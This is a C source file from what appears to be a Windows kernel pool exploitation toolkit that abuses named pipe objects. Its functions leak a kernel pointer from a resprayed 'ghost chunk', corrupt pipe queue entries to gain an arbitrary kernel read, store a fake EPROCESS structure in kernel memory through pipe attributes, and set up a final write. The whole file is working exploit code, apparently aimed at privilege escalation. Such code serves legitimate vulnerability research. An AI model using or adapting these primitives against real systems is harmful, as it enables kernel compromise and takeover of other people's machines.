#include <stdio.h>


#include "exploit.h"
#include "pipe_utils.h"
#include "logs.h"

void npp_exploit_arbitrary_read(xploit_t * xploit, uintptr_t where, char * out, size_t size)
{
    char arb_read[0x1000];

    // I need a temporary buffer and don't want to code a loop, so max it to 0x1000
    if (size >= 0x1000)
        size = 0xFFF;

    xploit->fake_pipe_queue_sub->data_ptr = where - xploit->current_pipe_offset;
    read_pipe(&xploit->ghosts->pipes[xploit->ghost_idx], arb_read, size);
    xploit->current_pipe_offset += size;
    memcpy(out, arb_read, size);
}


uintptr_t npp_find_file_object(xploit_t * xploit)
{
    uintptr_t file_object_ptr;
    uintptr_t pipe_queue_entry_addr;

    file_object_ptr = xploit->leak_root_queue - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
    xploit->leak_root_attribute = xploit->leak_root_queue - ROOT_PIPE_QUEUE_ENTRY_OFFSET + ROOT_PIPE_ATTRIBUTE_OFFSET;
    
    npp_exploit_arbitrary_read(xploit, xploit->leak_root_queue, (char *)&pipe_queue_entry_addr, 0x8);
    xploit->ghost_chunk = pipe_queue_entry_addr - POOL_HEADER_SIZE;
    
    printf("[+] ghost_chunk is :         0x%llX\n", xploit->ghost_chunk);
    printf("[+] leak_root_attribute is : 0x%llX\n", xploit->leak_root_attribute);


    return file_object_ptr;
}

void npp_alloc_fake_eprocess(xploit_t * xploit, char * fake_eprocess_buf)
{
    uintptr_t fake_eprocess_attribute;
    // The pipe queue entry list is corrupted, use the pipe attribute to store arbitrary data in the kernel
    set_pipe_attribute(&xploit->ghosts->pipes[xploit->ghost_idx], fake_eprocess_buf, DUMB_ATTRIBUTE_NAME2_LEN+(FAKE_EPROCESS_SIZE * 2));


    // We can read prev or next of the root to find the attribute that contains the arbitrary data
    npp_exploit_arbitrary_read(xploit, xploit->leak_root_attribute+0x8, (char *)&fake_eprocess_attribute, 0x8);
    printf("[+] fake_eprocess_attribute is : 0x%llx\n", fake_eprocess_attribute);

    // The data of the fake EPROCESS is at fake_eprocess_attribute->AttributeValue
    npp_exploit_arbitrary_read(xploit, fake_eprocess_attribute+0x20, (char *)&xploit->fake_eprocess, 0x8);
}

void npp_free_ghost_chunk(xploit_t * xploit)
{
    char string[0x100];
    read_pipe(&xploit->ghosts->pipes[xploit->ghost_idx], string, 1);
}

void npp_alloc_ghost_chunk(xploit_t * xploit, char * buffer)
{
    write_pipe(&xploit->ghosts->pipes[xploit->ghost_idx], buffer, xploit->ghost_chunk_size-xploit->struct_header_size);
}

void npp_setup_final_write(xploit_t * xploit, char * buffer)
{
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x10) = xploit->leak_root_queue;
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x18) = xploit->leak_root_queue;
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x20) = (uintptr_t)0;
    *(uintptr_t *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x28) = (uintptr_t)0;
    *(unsigned long *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x38) = (unsigned long)xploit->current_pipe_offset;
    *(unsigned long *)((unsigned char *)buffer + xploit->ghost_chunk_offset + 0x3c) = (unsigned long)0;
}

void npp_setup_ghost_overwrite(xploit_t * xploit, char * ghost_overwrite_buf)
{
    pipe_queue_entry_t  * overwritten_pipe_entry;

    overwritten_pipe_entry = (pipe_queue_entry_t*)((char *)ghost_overwrite_buf + xploit->ghost_chunk_offset + POOL_HEADER_SIZE);
    overwritten_pipe_entry->list.Flink = (LIST_ENTRY *)xploit->leak_root_queue;
    overwritten_pipe_entry->list.Blink = (LIST_ENTRY *)xploit->leak_root_queue;

    overwritten_pipe_entry->field_10 = (uintptr_t)xploit->fake_pipe_queue_sub;
    overwritten_pipe_entry->security = 0;


    overwritten_pipe_entry->field_20 = 0x1;
    overwritten_pipe_entry->DataSize = 0xffffffff;
    overwritten_pipe_entry->remaining_bytes = 0xffffffff;
    overwritten_pipe_entry->field_2C = 0x43434343;
}

int npp_get_leak(xploit_t * xploit, pipe_spray_t * respray)
{
    char leak[0x1000] = {0};

    xploit->leak_offset = xploit->targeted_vuln_size
        + xploit->offset_to_pool_header - xploit->backward_step
        - xploit->struct_header_size;
    printf("[+] Leak offset is 0x%X\n", xploit->leak_offset);

     // leak the data contained in ghost chunk
    xploit->leaking_pipe_idx = read_pipes(respray, leak);
    if (xploit->leaking_pipe_idx == -1)
    {
        if (xploit->backend == LFH)
            fprintf(stderr, "[-] Reading pipes found no leak :(\n");
        else
            LOG_DEBUG("Reading pipes found no leak");
        return 0;
    }

    printf("[+] Pipe %d of respray leaked data !\n", xploit->leaking_pipe_idx);

    // Read first qword of the leaked object
    // It is the pointer to the root pipe queue entry list
    xploit->leak_root_queue = *(uintptr_t *)((char *)leak + xploit->leak_offset + POOL_HEADER_SIZE);

    printf("[+] xploit->leak_root_queue ptr is 0x%llX\n", xploit->leak_root_queue);
    return 1;
}
